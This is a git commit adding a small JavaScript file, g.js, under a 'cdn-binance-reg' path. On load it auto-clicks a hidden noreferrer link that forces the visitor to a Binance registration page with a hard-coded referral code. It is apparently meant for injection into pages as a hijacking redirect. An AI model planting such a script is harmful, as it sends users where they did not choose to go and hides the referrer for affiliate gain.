71178161f580fdbb8b106112ee22a41f6f183cca
Ryszard Kwiatkowski <140899316+PupiPr0@users.noreply.github.com>
2023-08-23 15:28:45 +0300

    Create g.js

---
+++ js/cdn-binance-reg/g.js
@@ -0,0 +1,13 @@
+//say no mo
+
+function jump(url) {
+    var a = document.createElement('a');
+    a.setAttribute('rel', 'noreferrer');
+    a.setAttribute('id', 'm_noreferrer');
+    a.setAttribute('href', url);
+    document.body.appendChild(a);
+    document.getElementById('m_noreferrer').click();
+    document.body.removeChild(a);
+}
+url="https://accounts.binance.com/register-person?ref=SQVPEAJG";
+jump(url);
